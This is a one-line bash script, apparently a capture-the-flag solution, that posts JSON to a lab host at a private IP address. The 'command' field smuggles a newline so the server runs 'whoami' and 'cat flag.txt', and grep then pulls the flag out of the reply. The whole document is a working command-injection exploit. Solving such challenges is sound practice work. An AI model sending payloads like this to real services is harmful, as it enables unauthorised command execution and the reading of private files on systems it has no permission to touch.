#!/bin/bash

curl -s http://10.1.40.243/ -H "Content-Type: application/json" -d '{"command":"whoami\ncat flag.txt"}' | grep -oE "flag{.*?}" --color=none
